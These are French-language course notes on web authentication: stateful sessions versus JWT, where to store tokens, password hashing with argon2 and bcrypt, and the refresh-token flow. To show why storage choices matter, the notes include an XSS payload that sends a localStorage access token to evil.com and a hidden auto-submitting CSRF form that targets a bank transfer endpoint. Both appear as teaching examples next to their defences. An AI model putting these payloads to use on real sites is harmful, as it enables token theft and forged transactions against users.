# SC03E01 - Authentification

Théorie :
- Stratégies d'authentification
- Approches `Stateless` et `Stateful`
- Diagrammes de séquences

Pratique :
- `/auth/register` (**sign up**)
  - validation des données
  - hachage du mot de passe
  - tests
- `/auth/login` (**sign in**)
  - validation des identifiants
  - génération d'un JWT signé
  - analyse du JWT
  - stratégie de transmission et stockage (sécurité)
  - (bonus) refresh token
  - tests

Challenge :
- `/auth/refresh`
  - récupération et validation du refresh token
  - émission d'un nouveau couple tokens
  - tests
- `/auth/me`
  - vérification et décodage du token d'accès
  - récupération des données utilisateur
  - tests
- `/auth/logout` (**sign out**)
  - suppression (invalidation) des cookies
  - suppression/invalidation des refresh tokens


## Différentes approches d'authentification

[Fiche](../fiches/auth-strategies.md)

## Différences entre approche stateless (JWT) & approche stateful (session)

### Session

Lorsqu'un utilisateur s'authentifie pour la première fois, le serveur crée une **session dans un store** (base de données, mémoire, Redis...) afin d'y stocker des informations (ID utilisateur, panier, préférences, etc.). Le serveur renvoie l'identifiant de cette session (`sessionId`) au client, le plus souvent via un cookie.

À chaque requête suivante, le client envoie ce `sessionId`. Le serveur retrouve alors la session et, par son intermédiaire, les informations associées à l'utilisateur.

On parle d'authentification **stateful** car l'état de connexion est maintenu côté serveur. Chaque requête nécessite donc un accès au store pour reconstruire le contexte utilisateur.

**Analogie :** c'est comme louer un casier à la gare. On t'attribue un casier (la session) et on te donne une clé (le `sessionId`). Chaque fois que tu reviens, tu présentes la clé : l'employé retrouve ton casier et y accède.

[Stateful Session](../conception/uml/stateful-session.puml)

### JWT

Lorsque l'utilisateur s'authentifie pour la première fois, le serveur génère un **token (JWT) signé**. Ce token contient un payload minimal (ID utilisateur, rôle, éventuellement un scope) et une date d'expiration. Il est renvoyé au client, généralement via un cookie (HTTP-only) ou dans le corps de la réponse.

À chaque requête ultérieure, le client renvoie le token. Le serveur vérifie la signature (garantie d'intégrité et d'origine) puis décode le payload pour en extraire l'identité/utilisation et continuer le traitement sans requête vers un store.

On parle d'authentification **stateless** car aucun état serveur n'est nécessaire pour valider la session : la signature suffit et le payload contient les données essentielles.

**Analogie :** c'est comme un passeport. Une fois délivré par l'autorité, tu le présentes aux frontières. Les agents contrôlent son authenticité et sa validité sans aller consulter une base (hors contrôle approfondi), puis te laissent passer.

[Séquence Stateless JWT](../conception/uml/stateless-jwt.puml)

## Stockage des tokens de connexion

Tokens au sens large :
- `sessionId`
- `JWT access / refresh`
- tout autre token (opaque, etc.)

Stockage côté front-end :
- **`localStorage`**
  - Avantage : simple à manipuler (`localStorage.setItem`).
  - Inconvénient majeur : exposé aux **attaques XSS** (le JS injecté peut le lire).
- **Cookies**
  - Avantages :
    - définis par le serveur (`Set-Cookie`).
    - stockés et renvoyés automatiquement.
    - peuvent expirer automatiquement.
    - option `HttpOnly` empêche l'accès via JavaScript (`document.cookie`).
    - option `SameSite` limite certains scénarios CSRF.
  - Inconvénients : vulnérables aux **attaques CSRF** si `SameSite`, `Secure` ou des jetons anti-CSRF ne sont pas correctement configurés.
- **Mémoire volatile (state / variable JS)**
  - Impossible à relire après un rechargement / fermeture d'onglet (perte du contexte) → rarement suffisant seul.
- **Session Storage**
  - Identique en sécurité à `localStorage` vis‑à‑vis de XSS, persistance limitée à l'onglet.


### Attaques courantes si token dans `localStorage`

**XSS (Cross-Site Scripting)** : injection de JavaScript malveillant exécuté dans le navigateur de la victime.
- Attaquant : `BOB`
- Victime : `ALICE`
- Formulaire profil avec champ `firstname` mal échappé.
- BOB saisit : `<script>fetch('https://evil.com/steal', {method:'POST', body: localStorage.getItem('access_token')});</script>`
- Si l'appli fait `element.innerHTML = firstname`, le script s'exécute et exfiltre le token.

```js
element.innerHTML = userInput; // ❌ dangereux (exécute du HTML/JS injecté)
element.textContent = userInput; // ✅ sûr pour afficher du texte
```

### Attaques courantes si cookie mal sécurisé

**CSRF (Cross-Site Request Forgery)** : exploitation de la confiance d'un site envers le navigateur de l'utilisateur.
- Attaquant : `BOB`
- Victime : `ALICE`
- Alice est connectée à `bank.com` (cookie encore valide).
- BOB héberge `evil.com` qui force un POST caché vers `bank.com/transfer`.
- Le navigateur joint automatiquement le cookie de session.
- Sans protection (`SameSite=Lax|Strict`, token anti-CSRF, double-submit cookie...), l'action est traitée.
→ Résultat : virement à l'insu d'Alice.


```html
<!-- evil.com présente un formulaire automatisé -->

<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="BOB_COMPTE">
  <input type="hidden" name="amount" value="1000">
</form>

<script>document.forms[0].submit();</script>
```

## À nous de jouer : implémentation prévue

[Diagramme de Séquence de l'authentification](../conception/uml/authentification-oquiz.puml)

[Diagramme de Séquence avec refresh tokens](../conception/uml/refresh-token.puml)

[Notes sur les refresh Token](../fiches/refresh-token.md)

## Hachage de mot de passe

Attention au vocabulaire :
- **Chiffrement** : opération réversible (chiffrer/déchiffrer). Ex : SSH, HTTPS.
- **Hachage** : opération non réversible. On ne « dé-hache » pas un mot de passe. Ex : stockage sécurisé.


Algorithmes recommandés (OWASP) :
- `argon2` (souvent le choix moderne privilégié)
- `scrypt`
- `bcrypt`

À éviter (obsolètes ou faibles) :
- `md5`, `sha1` (trop rapides / collisions)

Ils fonctionnent sur un principe commun : paramétrage de la difficulté (temps, mémoire) + génération d'un sel aléatoire + production de l'empreinte.

```
$argon2id$v=19$m=65536,t=3,p=4$2QF21eQQr6BWCjW3OSEgVg$X7jpXBW3zci5KeAzU+Kf0ob+bnFstETK6j4JXBq9xuM

$argon2id -> algorithme choisi

         $v=19 -> version de l'algorithme

              $m=65536 -> mémoire utilisée
                      
                      t=3 -> nombre d'itérations
                        
                           p=4 -> facteur de parallélisme
                             
                             $2QF21eQQr6BWCjW3OSEgVg -> sel (salt)
                                                    
                                                    $X7jpXBW3zci5KeAzU+Kf0ob+bnFstETK6j4JXBq9xuM -> hash
```

Avant de hacher le mot de passe, l'algorithme génère un sel aléatoire pour introduire de l'entropie. Ainsi, deux utilisateurs ayant le même mot de passe auront des hash différents. Cela complique fortement les attaques par tables arc-en-ciel et l'analyse statistique (ex : « 50k hash identiques ⇒ même mot de passe »).

Le temps de calcul dépend notamment du **nombre d'itérations** (paramètre `t`) et de la mémoire utilisée :
- plus les paramètres sont élevés, plus le hash est coûteux à produire, ce qui ralentit les attaques brute-force.

Exemple avec `bcrypt`

```js
rounds=8 : ~40 hashes/sec
rounds=9 : ~20 hashes/sec
rounds=10: ~10 hashes/sec
rounds=11: ~5  hashes/sec
rounds=12: 2-3 hashes/sec
rounds=13: ~1 sec/hash
rounds=14: ~1.5 sec/hash
rounds=15: ~3 sec/hash
rounds=25: ~1 hour/hash
rounds=31: 2-3 days/hash
```

En général, on recherche un compromis entre sécurité (ralentir l'attaquant) et expérience utilisateur (ne pas bloquer l'inscription / connexion).


## Mécanisme du refresh token 

[Séquence](../conception/uml/refresh-token.puml)

[Fiche recap](../fiches/refresh-token.md)


Contexte :
- l'access token est expiré
- le front doit appeler `GET /api/levels` (route protégée)

Flux côté front :

1. Requête initiale `GET /api/levels` (en-tête Authorization avec access token) → `401 Unauthorized`.
2. Requête `POST /api/auth/refresh` (envoie refresh token - cookie HttpOnly idéalement) → nouveau couple (access + refresh).
3. Rejouer `GET /api/levels` avec le nouvel access token → `200 OK`.

→ Côté backend : 3 appels.
→ Côté utilisateur : surcoût quasi invisible (quelques millisecondes) si bien implémenté.

## Conseils pour l'apothéose

Simplifiez le plus possible :
- `access token` valable une journée
- pas de mécanisme de `refresh token`

L'important, c'est la documentation (diagramme) de votre mécanisme d'authentification en CDA, pas tant son implémentation.


